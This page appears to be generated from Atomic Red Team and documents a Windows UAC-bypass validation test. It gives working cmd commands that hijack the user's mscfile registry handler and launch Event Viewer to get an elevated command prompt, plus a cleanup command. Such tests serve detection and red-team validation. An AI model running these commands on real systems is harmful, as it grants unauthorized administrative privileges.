---
atomic_guid: "5073adf8-9a50-4bd9-b298-a9bd2ead8af9"
title: "Bypass UAC using Event Viewer (cmd)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "5073adf8-9a50-4bd9-b298-a9bd2ead8af9"
  - "Bypass UAC using Event Viewer (cmd)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Bypass UAC using Event Viewer (cmd)

Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privileges.

## Metadata

- Atomic GUID: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### executable_binary

- description: Binary to execute with UAC Bypass
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- name: command_prompt

### Command

```cmd
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
cmd.exe /c eventvwr.msc
```

### Cleanup

```cmd
reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
